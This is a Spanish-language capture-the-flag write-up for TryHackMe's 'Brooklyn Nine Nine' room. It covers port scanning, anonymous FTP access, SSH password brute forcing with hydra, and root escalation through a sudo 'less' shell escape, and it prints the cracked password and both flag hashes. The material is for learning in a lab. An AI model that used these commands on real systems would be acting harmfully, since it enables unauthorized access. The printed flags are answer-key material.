# Brooklyn Nine Nine — TryHackMe

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=flat)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=flat)
![Status](https://img.shields.io/badge/Status-Completed-blue?style=flat)

> **Fecha:** 25/04/2026
> **Autor:** [Josue Rendón](https://github.com/Slasho01)
> **Room:** [Brooklyn Nine Nine](https://tryhackme.com/room/brooklynninenine)

---

## 📋 Descripción

Room de dificultad fácil inspirada en la serie Brooklyn Nine Nine. Cubre enumeración de FTP con acceso anónimo, fuerza bruta SSH y escalada de privilegios mediante abuso de `less` con permisos sudo.

---

## 🎯 Objetivos

- [x] Flag de usuario
- [x] Flag de root

---

## 🔍 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -sC -sV <TARGET_IP>
```

**Resultado:**
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
|_-rw-r--r-- 1 0  0  119 May 17 2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

**Puertos relevantes:**
- `21` — FTP con **acceso anónimo habilitado** y archivo visible
- `22` — SSH, objetivo de acceso
- `80` — HTTP, página web del objetivo

**Puertos abiertos: 3**

---

## 🌐 2. Enumeración

### FTP — Acceso anónimo

El escaneo de nmap revela que el FTP permite login anónimo y hay un archivo `note_to_jake.txt` expuesto. Se accede sin credenciales:

```bash
ftp <TARGET_IP>
# User: anonymous
# Password: (vacío)
```

```bash
ftp> ls
ftp> get note_to_jake.txt
ftp> exit
```

**Contenido de `note_to_jake.txt`:**
```
From Amy,

Jake please change your password. It is too weak and 
an easy target for brute force!

- Amy
```

> La nota revela que el usuario `jake` tiene una contraseña débil — candidato directo para fuerza bruta SSH.

---

## 💥 3. Explotación

### 3.1 Fuerza bruta SSH

Con el usuario `jake` identificado y sabiendo que su contraseña es débil:

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh -t 4
```

**Credenciales obtenidas:** `jake:987654321`

### 3.2 Acceso SSH

```bash
ssh jake@<TARGET_IP>
```

### 3.3 Enumeración de usuarios

```bash
ls /home/
# amy  holt  jake
```

La flag de usuario está en el directorio de `holt`:

```bash
cat /home/holt/user.txt
```

---

## 🚩 4. Flags

### Flag de usuario

```
ee11cbb19052e40b07aac0ca060c23ee
```

---

## ⬆️ 5. Escalada de privilegios — sudo less

### Enumeración de sudo

```bash
sudo -l
```

```
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

### Vulnerabilidad identificada

> `less` puede ejecutar comandos de shell desde dentro de su interfaz. Al correrlo como sudo, cualquier comando ejecutado dentro tendrá permisos de root.

### Explotación

```bash
sudo less /etc/passwd
```

Dentro de less, ejecutar:

```
!/bin/bash
```

```bash
whoami
# root
```

### Flag de root

```bash
cat /root/root.txt
```

```
63a9f0ea7bb98050796b649e85481845
```

---

## 📝 6. Lecciones aprendidas

- El **acceso anónimo FTP** es una mala práctica que puede exponer información sensible como nombres de usuario
- Las **notas internas** en servidores pueden revelar información valiosa sobre usuarios y sus hábitos de seguridad
- Contraseñas débiles como `987654321` son trivialmente crackeables con rockyou.txt
- Binarios como `less`, `vim`, `nano` o `more` con permisos sudo son vectores clásicos de escalada — siempre revisar en **GTFOBins**
- `sudo -l` debe ser siempre el primer comando tras obtener acceso a un usuario

---

## 🔗 Referencias

- [GTFOBins — less](https://gtfobins.github.io/gtfobins/less/)
- [HackTricks — FTP Enumeration](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)

---

*Write-up por [Josue Rendón](https://github.com/Slasho01) · [TryHackMe Profile](https://tryhackme.com/p/Slasho)*
